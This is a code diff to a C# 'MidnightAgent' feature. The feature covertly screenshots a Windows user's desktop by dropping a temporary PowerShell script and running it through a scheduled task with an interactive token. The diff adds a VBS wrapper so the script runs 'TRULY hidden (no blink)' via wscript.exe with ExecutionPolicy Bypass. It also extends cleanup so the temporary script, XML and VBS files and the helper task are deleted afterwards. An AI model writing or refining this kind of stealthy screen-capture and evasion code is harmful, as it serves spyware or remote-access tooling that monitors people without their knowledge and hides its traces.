@@ -44,6 +44,7 @@ namespace MidnightAgent.Features
         {
             string psScriptPath = null;
             string xmlPath = null;
+            string vbsPath = null;
 
             try
             {
@@ -57,6 +58,15 @@ namespace MidnightAgent.Features
                 string psScript = $@"
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
+Add-Type -TypeDefinition @""
+    using System;
+    using System.Runtime.InteropServices;
+    public class User32 {{
+        [DllImport(""user32.dll"")]
+        public static extern bool SetProcessDPIAware();
+    }}
+""@
+[User32]::SetProcessDPIAware()
 $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
 $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
@@ -66,6 +76,11 @@ $graphics.Dispose()
 $bitmap.Dispose()
 ";
                 File.WriteAllText(psScriptPath, psScript);
+
+                // 2.5 Create VBS wrapper to run PowerShell TRULY hidden (no blink)
+                vbsPath = Path.Combine(Path.GetTempPath(), $"wrap_{Guid.NewGuid():N}.vbs");
+                string vbsScript = $@"CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -File """"{psScriptPath}"""""", 0, True";
+                File.WriteAllText(vbsPath, vbsScript);
 
                 // 3. Create XML task definition with InteractiveToken
                 xmlPath = Path.Combine(Path.GetTempPath(), $"task_{Guid.NewGuid():N}.xml");
@@ -101,8 +116,8 @@ $bitmap.Dispose()
   </Settings>
   <Actions>
     <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File ""{psScriptPath}""</Arguments>
+      <Command>wscript.exe</Command>
+      <Arguments>//B //Nologo ""{vbsPath}""</Arguments>
     </Exec>
   </Actions>
 </Task>";
@@ -118,17 +133,17 @@ $bitmap.Dispose()
                     Thread.Sleep(500);
                     if (File.Exists(outputPath) && new FileInfo(outputPath).Length > 10000)
                     {
-                        Cleanup(psScriptPath, xmlPath);
+                        Cleanup(psScriptPath, xmlPath, vbsPath);
                         return true;
                     }
                 }
 
-                Cleanup(psScriptPath, xmlPath);
+                Cleanup(psScriptPath, xmlPath, vbsPath);
                 return false;
             }
             catch
             {
-                Cleanup(psScriptPath, xmlPath);
+                Cleanup(psScriptPath, xmlPath, vbsPath);
                 return false;
             }
         }
@@ -173,11 +188,12 @@ $bitmap.Dispose()
             }
         }
 
-        private void Cleanup(string psScriptPath, string xmlPath)
+        private void Cleanup(string psScriptPath, string xmlPath, string vbsPath)
         {
             try { RunSchtasks($"/Delete /TN \"{HELPER_TASK_NAME}\" /F"); } catch { }
             try { if (psScriptPath != null) File.Delete(psScriptPath); } catch { }
             try { if (xmlPath != null) File.Delete(xmlPath); } catch { }
+            try { if (vbsPath != null) File.Delete(vbsPath); } catch { }
         }
     }
 }
